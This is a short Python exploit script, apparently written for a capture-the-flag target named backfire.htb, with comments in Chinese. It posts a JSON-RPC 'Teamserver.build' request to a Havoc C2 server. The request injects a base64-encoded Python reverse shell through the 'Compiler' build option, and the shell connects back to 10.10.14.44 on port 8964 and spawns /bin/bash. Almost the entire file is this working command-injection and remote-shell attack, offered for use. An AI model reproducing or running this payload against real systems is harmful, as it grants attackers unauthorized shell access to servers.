from ssl import Options
import requests
import json
import urllib3
import datetime
import base64
# 妈的，先把那个烦人的证书警告给关了
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_request(url, payload, headers):
    response = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)#payload必須是json格式 POST請求
    print(f'返回內容: {response.text}')
    print(f'返回狀態碼: {response.status_code}')
def main():
    start_time = datetime.datetime.now()
    url = "https://10.10.11.49:443/"
    evil_code = f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.44\",8964));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"
    evil_code_base64 = base64.b64encode(evil_code.encode()).decode()
    payload = {
        "url": "http://127.0.0.1:40056/havoc/", #這個是後門的url
        "JsonRPC": "2.0",
        "method": "Teamserver.build",
        "params": [
            {
                "Agent": "Demon",
                "Arch": "x64",
                "Format": "elf",
                "Listener": "Demon Listener", # 这个名字来自 havoc.yaotl！
                "OS": "linux",
                "Options":{
                    "Compiler": f"bash -c '{evil_code_base64} | base64 -d | python'",
                    "Commands":[],
                    "EntryPoint": "main",
                    "Format": "Default",
                    "Sleep": 1000,
                    "Static": False,
                    "Technique": "syscall"
                },
                "Sleep": 0,
            },
        ],
        "id": 1
    }
    headers = {
        'Host': 'backfire.htb',
        'Content-Type': 'application/json'
    }
    send_request(url, payload, headers)
    end_time = datetime.datetime.now()
    print(f"開始時間: {start_time}")
    print(f"結束時間: {end_time}")
    print(f"執行時間: {end_time - start_time}")
if __name__ == "__main__":
    main()